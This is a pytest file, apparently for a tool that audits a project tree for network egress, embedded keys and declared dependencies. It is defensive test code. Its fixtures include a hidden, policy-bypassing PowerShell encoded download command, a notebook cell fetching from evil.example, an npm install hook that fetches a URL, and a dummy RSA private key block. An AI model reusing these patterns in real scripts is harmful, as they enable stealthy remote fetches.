"""Package managers and build tools of other ecosystems, Python handed over through files, pipes and variables,
programs judged by where they connect, notebooks for other kernels and what notebooks show, classes a configuration
loads by name, and digests that hold for any checkout. Each test asserts both halves where there are two: the
false thing is gone, the true neighbour stays."""
from __future__ import annotations

import base64
import gzip
import io
import json
import pickle
import zipfile
from dataclasses import asdict
from pathlib import Path

import pytest

from entrovouch import cbom, key_provenance, sbom, timestamp
from entrovouch.no_egress_auditor import audit, report_problem

PEM = ("-----BEGIN RSA PRIVATE KEY-----\n" + "MIIEowIBAAKCAQEAu1SU1LfVLPHCozMxH2Mo4lgOEePzNm0tRgeLezV6ffAt0gun\n" * 4
       + "-----END RSA PRIVATE KEY-----\n")
PY = 'import urllib.request, os\nurllib.request.urlopen(os.environ["U"])\n'
NET = {"script-network-command", "network-import", "network-call", "subprocess-net-binary"}


def _write(root: Path, rel: str, body) -> Path:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    if isinstance(body, bytes):
        p.write_bytes(body)
    else:
        p.write_text(body, encoding="utf-8", newline="\n")
    return p


def _kinds(root: Path) -> set[str]:
    return {f["kind"] for f in audit(root, label="t").findings} - {"external-url"}


# ---------------------------------------------------------------- other ecosystems' installers and fetchers
@pytest.mark.parametrize("line", [
    "yarn", "yarn --frozen-lockfile", "bun install", "pnpm dlx create-x", "poetry install --no-interaction",
    "pipenv install", "pdm install", "conda env create -f env.yml", "bundle install", "composer install",
    "go mod download", "cargo build --locked", "mvn -B package", "./gradlew build", "dotnet restore",
    "terraform init", "rustup toolchain install stable", "ping -c 1 example.com", "rclone copy a remote:b",
])
def test_an_installer_or_fetcher_of_another_ecosystem_is_a_command(tmp_path, line):
    _write(tmp_path, "a.sh", line + "\n")
    assert "script-network-command" in _kinds(tmp_path), line


@pytest.mark.parametrize("line, kind", [
    ("yarn test", None), ("mvn -o package", None), ("echo install yarn first", None),
    ("ping -c 1 localhost", "loopback-call"),
])
def test_the_same_tools_that_stay_here_or_are_only_named(tmp_path, line, kind):
    _write(tmp_path, "a.sh", line + "\n")
    assert _kinds(tmp_path) == ({kind} if kind else set()), line


def test_a_bare_yarn_step_in_a_workflow(tmp_path):
    _write(tmp_path, ".github/workflows/ci.yml", "jobs:\n  a:\n    steps:\n      - run: yarn\n      - run: yarn test\n")
    assert [f["line"] for f in audit(tmp_path, label="t").findings] == [4]


# ---------------------------------------------------------------- Python handed over through files, pipes, variables
@pytest.mark.parametrize("name, text", [
    ("a.sh", "cat > /tmp/x.py <<'EOF'\n" + PY + "EOF\npython3 /tmp/x.py\n"),
    ("b.sh", "tee /tmp/x.py <<'EOF'\n" + PY + "EOF\n"),
    ("Dockerfile", "FROM scratch\nCOPY <<EOF /app/x.py\n" + PY + "EOF\n"),
    ("c.sh", "echo 'import socket' | python3\n"),
    ("d.sh", "printf '%s\\n' 'import socket' 'socket.create_connection((\"h\", 80))' | python3 -\n"),
    ("e.sh", "$PYTHON - <<'EOF'\n" + PY + "EOF\n"),
    ("f.sh", "\"${PYTHON:-python3}\" - <<'EOF'\n" + PY + "EOF\n"),
    ("g.sh", "$PYTHON -c 'import socket'\n"),
    ("Makefile", "a:\n\t$(PYTHON) -c 'import socket'\n"),
    ("h.bat", "\"C:\\Program Files\\Python312\\python.exe\" -c \"import socket\"\n"),
    ("i.bat", "pythonw -c \"import socket\"\n"),
    ("Dockerfile", 'FROM scratch\nRUN ["python", "-c", "import socket"]\n'),
    ("Dockerfile", "FROM scratch\nRUN <<EOF\n#!python3\n" + PY + "EOF\n"),
])
def test_python_handed_over_in_more_ways_is_read(tmp_path, name, text):
    _write(tmp_path, name, text)
    assert "network-import" in _kinds(tmp_path)


def test_a_here_document_written_to_a_file_that_is_not_python_stays_lines(tmp_path):
    _write(tmp_path, "a.sh", "cat > notes.txt <<'EOF'\nimport socket\nEOF\necho 'import socket'\n")
    assert _kinds(tmp_path) == set()


@pytest.mark.parametrize("yml", [
    "defaults:\n  run:\n    shell: python\njobs:\n  a:\n    steps:\n      - run: |\n          " + PY.replace("\n", "\n          "),
    "jobs:\n  a:\n    defaults:\n      run:\n        shell: python\n    steps:\n      - run: |\n          import socket\n",
    "jobs:\n  a:\n    steps:\n      - shell: python3 -u {0}\n        run: |\n          import socket\n",
    "jobs:\n  a:\n    steps:\n      - shell: python\n        run: import socket; socket.create_connection((H, 80))\n",
])
def test_a_step_whose_shell_is_python_is_read_as_python(tmp_path, yml):
    _write(tmp_path, ".github/workflows/ci.yml", yml)
    assert "network-import" in _kinds(tmp_path)


def test_a_step_that_sets_its_own_shell_overrides_the_default(tmp_path):
    _write(tmp_path, ".github/workflows/ci.yml", "defaults:\n  run:\n    shell: python\njobs:\n  a:\n    steps:\n"
                                                 "      - shell: bash\n        run: |\n          curl -s $U\n")
    assert _kinds(tmp_path) == {"script-network-command"}


# ---------------------------------------------------------------- PowerShell and Windows spellings
@pytest.mark.parametrize("name, line", [
    ("s.ps1", "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand "
              + base64.b64encode("Start-BitsTransfer -Source $u -Destination $f".encode("utf-16-le")).decode()),
    ("s.ps1", "powershell -NonInteractive -enc:" + base64.b64encode("Invoke-WebRequest $u".encode("utf-16-le")).decode()),
    ("s.ps1", "git.exe pull"), ("s.bat", "pip.exe install requests"), ("s.bat", "call npm.cmd ci"),
    ("s.ps1", "& \"C:\\Program Files\\Git\\bin\\git.exe\" pull"), ("s.ps1", "& 'pip' install requests"),
    ("s.ps1", "Send-MailMessage -SmtpServer smtp.example.com -To a@b.c"),
    ("s.ps1", "Invoke-Command -ComputerName srv01 -ScriptBlock { x }"),
    ("s.ps1", "Copy-Item \\\\server\\share\\x.exe C:\\x.exe"),
    ("s.ps1", "$w = New-Object System.Net.WebSockets.ClientWebSocket"), ("s.ps1", "$r = Invoke-RestMethod -Uri $u"),
])
def test_windows_spellings_of_network_commands(tmp_path, name, line):
    _write(tmp_path, name, line + "\n")
    assert "script-network-command" in _kinds(tmp_path), line


def test_this_machines_own_paths_are_not_unc(tmp_path):
    _write(tmp_path, "s.ps1", "Get-Item \\\\?\\C:\\very\\long\\path\nGet-Item \\\\.\\pipe\\x\n")
    assert _kinds(tmp_path) == set()


# ---------------------------------------------------------------- where a program connects
@pytest.mark.parametrize("line, kind", [
    ('psql "$DATABASE_URL" -c "select 1"', "script-network-command"),
    ("PGHOST=db.example.com psql -U app -c x", "script-network-command"),
    ("psql service=prod", "script-network-command"),
    ("MYSQL_HOST=db.example.com mysql -u root", "script-network-command"),
    ("mysql --defaults-extra-file=prod.cnf", "script-network-command"),
    ("psql -h /var/run/postgresql -c x", "loopback-call"),
    ("psql postgresql:///db -c x", "loopback-call"),
    ("redis-cli -u redis://localhost:6379 ping", "loopback-call"),
    ("DOCKER_HOST=ssh://deploy@prod.example.com docker ps", "script-network-command"),
    ("DOCKER_HOST=unix:///var/run/docker.sock docker ps", None),
    ("nc -l 8080", "inbound-listener"),
    ("socat TCP-LISTEN:8080,fork TCP:localhost:80", "inbound-listener"),
    ("helm template rel ./chart", None), ("helm lint ./chart", None),
    ("helm template rel bitnami/nginx", "script-network-command"),
    ("kubectl kustomize ./overlay", None), ("docker swarm init", None), ("docker import a.tar", None),
    ("git clone ./local /tmp/x", None), ("git clone file:///srv/repo.git", None),
    ("git submodule status", None), ("git submodule update --init", "script-network-command"),
    ("curl --version", None), ("svn export . /tmp/x", None),
])
def test_a_program_is_judged_by_where_it_connects(tmp_path, line, kind):
    _write(tmp_path, "a.sh", line + "\n")
    assert _kinds(tmp_path) == ({kind} if kind else set()), line


def test_a_database_host_set_in_the_file_s_environment(tmp_path):
    _write(tmp_path / "a", "a.sh", "export PGHOST=db.prod.internal\npsql -U app -c x\n")
    _write(tmp_path / "b", "a.sh", "export PGHOST=localhost\npsql -U app -c x\n")
    assert _kinds(tmp_path / "a") == {"script-network-command"}
    assert _kinds(tmp_path / "b") == {"loopback-call"}


def test_python_argv_with_a_host_from_the_environment(tmp_path):
    _write(tmp_path, "a.py", "import os, subprocess\nsubprocess.run(['psql', os.environ['DATABASE_URL'], '-c', 'x'])\n")
    assert "loopback-call" not in _kinds(tmp_path)


# ---------------------------------------------------------------- JavaScript
def test_jsx_text_with_a_backquote_or_a_glob_hides_no_code(tmp_path):
    _write(tmp_path, "a.jsx", "export const H = () => <p>Press ` to open</p>\nexport async function f(u) {\n"
                              "  const ws = require('ws')\n  return fetch(u)\n}\nexport const g = (n) => `hi ${n}`\n")
    _write(tmp_path, "b.jsx", "export const H = () => <p>Match src/* or lib/*.js</p>\nexport function f(u) {\n"
                              "  const ws = require('ws')\n}\n/* helpers */\n")
    found = {(f["file"], f["line"], f["kind"]) for f in audit(tmp_path, label="t").findings}
    assert {("a.jsx", 3, "network-import"), ("a.jsx", 4, "network-call"), ("b.jsx", 3, "network-import")} <= found


def test_real_template_literals_and_comments_still_hold_their_text(tmp_path):
    _write(tmp_path, "a.js", "const f = (n) => `hello ${n}`\nconst g = c ? `require(\"net\")` : `b`\n"
                             "function h() { return `x` }\nconst a = b /*require('net')*/ + 1\n")
    assert _kinds(tmp_path) == set()


def test_created_elements_component_generics_and_deno_specifiers(tmp_path):
    _write(tmp_path, "a.js", "const img = document.createElement('img')\nimg.src = endpoint\n")
    _write(tmp_path, "b.vue", '<script setup lang="ts" generic="T extends Record<string, unknown>">\n'
                              "import axios from 'axios'\n</script>\n")
    _write(tmp_path, "c.ts", "import a from 'npm:axios@1.6'\nimport s from 'jsr:@std/http@1/server'\n")
    rep = audit(tmp_path, label="t")
    found = {(f["file"], f["kind"]) for f in rep.findings}
    assert {("a.js", "unresolved-call"), ("b.vue", "network-import"), ("c.ts", "network-import")} <= found
    assert rep.unlisted_js_imports == ["jsr:@std/http"]


# ---------------------------------------------------------------- notebooks
def _nb(root: Path, cells: list[dict], meta: dict | None = None) -> None:
    _write(root, "n.ipynb", json.dumps({"nbformat": 4, "nbformat_minor": 5, "metadata": meta or {},
                                         "cells": [dict(c, metadata={}) for c in cells]}))


def test_a_notebook_for_another_kernel_is_not_analysed(tmp_path):
    _nb(tmp_path, [{"cell_type": "code", "source": 'download.file("https://evil.example/x", "x")', "outputs": [],
                    "execution_count": None}], {"kernelspec": {"name": "ir", "language": "R"}})
    assert _kinds(tmp_path) == {"unparseable-source"}


def test_what_a_notebook_shows_is_read(tmp_path):
    _nb(tmp_path, [{"cell_type": "markdown", "source": "![x](https://evil.example/x.png)"},
                   {"cell_type": "code", "source": "x = 1", "execution_count": 1, "outputs": [
                       {"output_type": "display_data", "metadata": {},
                        "data": {"text/html": "<script src='https://cdn.example/a.js'></script>",
                                 "application/javascript": "fetch(window.U)"}}]}])
    found = {(f["line"], f["kind"]) for f in audit(tmp_path, label="t").findings}
    assert {(1, "html-external"), (2, "html-external"), (2, "network-call")} <= found


# ---------------------------------------------------------------- classes loaded by name
def test_classes_a_configuration_loads_by_name(tmp_path):
    _write(tmp_path, "settings.py",
           "LOGGING = {'handlers': {'h': {'class': 'rollbar.logger.RollbarHandler'}, "
           "'m': {'class': 'logging.handlers.SMTPHandler'}}}\n"
           "MIDDLEWARE = ['rollbar.contrib.django.middleware.RollbarNotifierMiddleware']\n"
           "UNSAFE_HANDLERS = ('logging.handlers.SMTPHandler', 'logging.handlers.HTTPHandler')\n"
           "def check(cfg):\n    assert cfg['class'] != 'logging.handlers.HTTPHandler'\n")
    lines = sorted((f["line"], f["kind"]) for f in audit(tmp_path, label="t").findings)
    assert lines == [(1, "network-call"), (1, "network-import"), (2, "network-import")]


def test_a_network_submodule_reached_through_its_package(tmp_path):
    _write(tmp_path, "a.py", "import http\nc = http.client.HTTPSConnection('api.example.com')\n")
    _write(tmp_path, "b.py", "import http\nok = http.HTTPStatus.OK\n")
    assert {(f["file"], f["kind"]) for f in audit(tmp_path, label="t").findings} == {("a.py", "network-import")}


# ---------------------------------------------------------------- one tree, one report
def test_a_stand_in_naming_a_skipped_directory_is_decided_by_its_name(tmp_path):
    for sub in ("fresh", "used"):
        _write(tmp_path / sub, "app.py", "print('hi')\n")
        _write(tmp_path / sub, ".dockerignore", "build")
        _write(tmp_path / sub, ".npmignore", "node_modules")
    _write(tmp_path / "used", "build/lib/app.py", "x = 1\n")
    _write(tmp_path / "used", "node_modules/x/index.js", "x\n")
    assert audit(tmp_path / "fresh", label="t").findings_digest == audit(tmp_path / "used", label="t").findings_digest


def test_a_large_text_artifact_folds_its_line_endings(tmp_path):
    rows = pickle.dumps([f"{i:08d}" + "x" * 60 for i in range(17 * 2 ** 20 // 80)], protocol=0)
    _write(tmp_path / "lf", "data.pkl", rows)
    _write(tmp_path / "crlf", "data.pkl", rows.replace(b"\n", b"\r\n"))
    assert len(rows) > 16 << 20
    assert audit(tmp_path / "lf", label="t").subject_digest == audit(tmp_path / "crlf", label="t").subject_digest


def test_deeply_nested_json_does_not_stop_a_run(tmp_path):
    _write(tmp_path, "n_structure_100000_opening_arrays.json", "[" * 100000)
    _write(tmp_path, "n.ipynb", "[" * 100000 + "]" * 100000)
    _write(tmp_path, "package.json", "[" * 100000 + "]" * 100000)
    _write(tmp_path, "app.py", "x = 1\n")
    kp = key_provenance.scan_key_provenance(tmp_path, label="t")
    assert kp.verdict == "REVIEW" and [f["file"] for f in kp.files_not_parsed] == ["n.ipynb"]
    assert audit(tmp_path, label="t").verdict == "FINDINGS"          # the notebook is reported as not parsed
    assert cbom.build_cbom(tmp_path, label="t").verdict != "NOT-ANALYSED"


# ---------------------------------------------------------------- key_provenance, manifests, SBOM
def test_a_zip_with_a_prefix_and_other_compressors(tmp_path):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("k.txt", PEM)
    _write(tmp_path, "app.pyz", b"#!/usr/bin/env python3\n" + buf.getvalue())
    _write(tmp_path, "a.lz4", b"\x04\x22\x4d\x18xxxx")
    _write(tmp_path, "b.Z", b"\x1f\x9dxxxx")
    rep = asdict(key_provenance.scan_key_provenance(tmp_path, label="t"))
    assert [f["file"] for f in rep["findings"]] == ["app.pyz"]
    assert rep["not_scanned"]["archives_not_opened"] == ["a.lz4", "b.Z"]


def test_test_runners_and_npm_scripts_declare_what_they_install(tmp_path):
    _write(tmp_path, "setup.py", "from setuptools import setup\nREQ = ['httpx']\nsetup(name='x', install_requires=REQ)\n")
    _write(tmp_path, "tox.ini", "[testenv]\ndeps =\n    py312: requests\n    -rreq.txt\n")
    _write(tmp_path, "noxfile.py", "import nox\n@nox.session\ndef t(s):\n    s.install('websockets', '.')\n")
    _write(tmp_path, "package.json", json.dumps({"name": "x", "scripts": {
        "prepare": "node -e \"require('https').get(process.env.U)\"", "lint": "node -e \"console.log(1)\""}}))
    found = {(f["file"], f["kind"]) for f in audit(tmp_path, label="t").findings}
    assert {("setup.py", "declared-network-dependency"), ("tox.ini", "declared-network-dependency"),
            ("noxfile.py", "declared-network-dependency"), ("package.json", "declared-remote-source")} <= found
    assert sum(1 for f in audit(tmp_path, label="t").findings if f["file"] == "package.json") == 1


def test_a_compose_image_is_pulled_unless_its_service_builds_it(tmp_path):
    _write(tmp_path, "compose.yaml", "services:\n  db:\n    image: postgres:16\n  app:\n    build: .\n    image: myapp:dev\n")
    assert [(f["line"], f["kind"]) for f in audit(tmp_path, label="t").findings] == [(3, "declared-remote-source")]


def test_purls_for_another_index_and_unusual_versions(tmp_path):
    _write(tmp_path, "pyproject.toml", "[tool.poetry]\nname='x'\n[tool.poetry.dependencies]\n"
                                       "c9 = {version='1.0.0', source='private'}\na4 = '2.31.0+local'\na11 = '01.0'\n")
    purls = {c["name"]: c.get("purl") for c in asdict(sbom.build_sbom(tmp_path, label="t"))["components"]}
    assert purls == {"c9": "", "a4": "pkg:pypi/a4@2.31.0%2Blocal", "a11": "pkg:pypi/a11@1.0"}


# ---------------------------------------------------------------- adapters and timestamps
def test_a_null_integrity_tag_on_a_signed_report_is_refused_everywhere(tmp_path):
    from entrovouch.no_egress_auditor import verify_report
    from entrovouch.signer import MerkleSigner
    _write(tmp_path / "t", "a.py", "import requests\n")
    signed = asdict(audit(tmp_path / "t", label="L", signer=MerkleSigner.create(tmp_path / "k.json", height=3)))
    assert report_problem(signed) is None
    nulled = dict(signed, integrity_tag=None)
    assert verify_report(nulled, expected_root=signed["public_root"]) == (False, "TAMPERED")
    assert report_problem(nulled)                   # the converters refuse it as verify does


def test_a_request_inside_more_sequences_is_still_a_request():
    digest = bytes(range(32))
    req, _ = timestamp.build_request(digest, nonce=7)
    wrapped = timestamp._der_seq(timestamp._der_seq(req))
    assert timestamp.token_contains_digest(wrapped, digest) is False
    rejected = timestamp._der_seq(timestamp._der_seq(timestamp._der_int(2), timestamp._der_seq(b"\x0c\x02no")))
    assert timestamp._is_timestamp_request(rejected) is False


# ---------------------------------------------------------------- what the earlier sets showed about these rules
def test_a_variable_given_to_an_option_that_names_no_host(tmp_path):
    _write(tmp_path, "a.sh", "psql -AtqwlF $SEP -c x\n")
    assert _kinds(tmp_path) == {"loopback-call"}


def test_a_name_lookup_is_a_lookup_not_a_connection(tmp_path):
    _write(tmp_path, "a.py", "import socket\nfor r in socket.getaddrinfo(host, 80):\n    pass\n"
                             "socket.getaddrinfo('localhost', 80)\n")
    details = {f["line"]: (f["kind"], f["detail"]) for f in audit(tmp_path, label="t").findings}
    assert details[2][0] == "network-call" and "looks a name up" in details[2][1]
    assert details[4][0] == "loopback-call"


def test_src_is_judged_only_on_elements_this_file_makes(tmp_path):
    _write(tmp_path, "a.js", "var s = document.createElement('script')\nExpr.attrHandle.href = function (e) {}\n"
                             "ajaxLocation.href = ''\nevent.src = a\nimage.src = URL.createObjectURL(b)\ns.src = url\n")
    assert [(f["line"], f["kind"]) for f in audit(tmp_path, label="t").findings] == [(6, "unresolved-call")]


def test_a_test_matrix_names_each_package_once(tmp_path):
    _write(tmp_path, "tox.ini", "[testenv:a]\ndeps =\n    httpx\n[testenv:b]\ndeps =\n    httpx==0.27\n    requests\n")
    found = [(f["line"], f["detail"].split("'")[1]) for f in audit(tmp_path, label="t").findings]
    assert found == [(3, "httpx"), (7, "requests")]
